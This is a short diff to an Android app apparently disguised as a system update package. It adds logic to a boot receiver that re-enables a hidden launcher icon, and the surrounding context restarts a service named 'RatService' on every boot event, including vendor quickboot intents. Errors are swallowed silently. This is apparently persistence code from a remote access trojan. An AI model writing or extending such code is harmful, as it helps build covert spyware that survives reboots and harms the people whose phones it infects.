@@ -1,8 +1,10 @@
 package com.system.update
 
 import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 
 class BootReceiver : BroadcastReceiver() {
@@ -12,6 +14,20 @@ class BootReceiver : BroadcastReceiver() {
             action == Intent.ACTION_LOCKED_BOOT_COMPLETED ||
             action == "android.intent.action.QUICKBOOT_POWERON" ||
             action == "com.htc.intent.action.QUICKBOOT_POWERON") {
+
+            // Restore icon kalau di-hide
+            try {
+                val pm = context.packageManager
+                val component = ComponentName(context, MainActivity::class.java)
+                val state = pm.getComponentEnabledSetting(component)
+                if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                    pm.setComponentEnabledSetting(
+                        component,
+                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                }
+            } catch (_: Exception) {}
 
             // Restart RatService
             try {
